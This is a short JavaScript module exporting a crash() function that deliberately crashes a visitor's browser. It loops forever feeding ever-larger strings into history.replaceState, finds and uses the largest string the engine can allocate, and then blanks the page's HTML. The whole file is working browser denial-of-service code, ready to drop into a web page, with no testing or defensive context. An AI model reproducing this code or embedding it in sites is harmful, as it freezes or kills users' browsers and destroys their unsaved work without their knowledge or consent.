export function crash() {
	history.pushState(undefined, '', location.href);
	crashWindow();
	crashTab();
	fakeCrashTab();
	history.replaceState(undefined, '', location.href);
}

function crashWindow() {
	const payload = 'ඞ'.repeat(10_000);
	let cum = '';
	for (;;) history.replaceState(undefined, '', (cum += payload));
}

function crashTab() {
	try {
		history.replaceState(undefined, '', getLargestPossibleString());
	} catch {}
}

function fakeCrashTab() {
	document.documentElement.outerHTML = '';
}

const baseString = 'ඞ';
/** @type {string | undefined} */
let largestPossibleString;
function getLargestPossibleString() {
	let string = largestPossibleString;

	if (!string) {
		let zeroCount = 16;
		for (; zeroCount > 0; zeroCount--) {
			const count = Number(`1${'0'.repeat(zeroCount)}`);
			try {
				string = baseString.repeat(count);
				break;
			} catch {
				continue;
			}
		}

		// binary search for largest possible string
		let low = Number(`1${'0'.repeat(zeroCount)}`);
		let high = Number(`1${'0'.repeat(zeroCount + 1)}`);
		while (low + 1 < high) {
			const mid = Math.floor((low + high) / 2);
			try {
				string = baseString.repeat(mid);
				low = mid;
			} catch {
				high = mid;
			}
		}

		largestPossibleString = string;
	}

	return string;
}
